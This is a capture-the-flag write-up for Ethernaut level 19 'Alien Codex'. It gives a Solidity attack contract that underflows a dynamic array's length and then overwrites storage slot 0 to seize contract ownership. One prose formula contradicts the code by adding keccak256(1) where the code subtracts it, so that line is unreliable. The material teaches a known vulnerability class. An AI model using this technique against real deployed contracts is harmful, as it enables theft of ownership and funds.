---
description: storage layout
---

# 19 - Alien Codex

Ethernaut Level19: [Alien Codex](https://ethernaut.openzeppelin.com/level/0x40055E69E7EB12620c8CCBCCAb1F187883301c30)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```

### Goal of this level

* claim ownership

### What you should know before

* Artihmetic overflow/underflow
* Storage Layout (dynamic array especially)\
  \-> see [here](https://www.youtube.com/watch?v=Gg6nt3YW74o\&list=PLO5VPQH6OWdWsCgXJT9UuzgbC8SPvTRi5\&index=4)
* Ownable.sol\
  \-> see [here](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol)

## Solution

<details>

<summary>Key to solve this problem 🔑</summary>

* `owner` is located at slot0. So will `store` player address to slot0\
  (`owner` and `contact` are packed into slot0)
* `codex[i]` is located at `keccak256(1) + i`

</details>

```solidity
contract AttackAlienCodex {
    function attack(address _instance) external {
        // (2**256 - 1) - keccak256(1) + 1
        uint256 slot0Index = uint256(-1) - uint256(keccak256(abi.encode(1))) + uint256(1);
        
        // 00000000000000000000000034B4ab0479D10FdbAA3b52C8371C7B1BE5c73bb7 (player address)
        bytes32 playerAddr = bytes32(uint256(uint160(tx.origin)));
    
        _instance.call(abi.encodeWithSignature("make_contact()"));

        // length of codex will be 2**256 - 1
        _instance.call(abi.encodeWithSignature("retract()"));
        
        _instance.call(abi.encodeWithSignature("revise(uint256,bytes32)", slot0Index, playerAddr));
    }
}
```

We will exploit **arithmetic underflow** here.

Storage has `2**256` slots (slot `0` \~ slot `2**256-1`).

Inital value of `codex.length` is `0`.&#x20;

So when we call `retract()` this will cause arithmetic overflow, making the value of `codex.length` `2**256 - 1`.

Now solidity thinks of codex as an array with `2**256 - 1` elements which lets us access any slot of storage.

`codex[0]` is located at slot `keccak256(1)`.

`codex[i]` is at slot `keccak256(1) + i`, \
so we will find `i` that satisfies `keccak256(1) + i  === 2**256`.

So `i` should be

```solidity
uint256(-1) + uint256(keccak256(abi.encode(1))) + uint256(1)
```

Since uint256 variable cannot store `2**256`, \
we subtract `keccak256(1)` from `2**256 - 1` and add `1` back.

Done! 😎
